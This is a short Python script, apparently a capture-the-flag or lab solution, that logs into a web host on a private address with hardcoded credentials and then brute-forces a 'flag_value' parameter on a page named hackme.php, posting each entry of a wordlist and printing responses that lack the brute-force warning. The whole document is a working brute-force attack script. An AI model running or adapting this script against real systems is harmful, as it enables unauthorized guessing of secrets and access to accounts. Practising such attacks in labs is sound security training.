import requests
lines = []

with open("wordlist.txt", "r") as raft:
    lines = raft.readlines()

s = requests.Session()

credentials = {
    'username': 'silver',
    'password': 'wolf'
}

response = s.post('http://192.168.228.212/check.php', data=credentials)
print(response.text)

#response1 = s.post('http://192.168.228.212/hackme.php')
#print(response1.text)

for i in lines:
    mydata = { 'flag_value':i.replace("\n","")}
    #Set our post parameter of flag_value to the current work in raft-small-words.txt

    response2 = s.post('http://192.168.228.212/hackme.php', data=mydata)
    #Post the info to the webpage using the current session

    currentPageText = response2.text
    #Save current page to a text variable

    if "brute-force" not in currentPageText:
        print(response2.text)
    #check to see if the text above is not there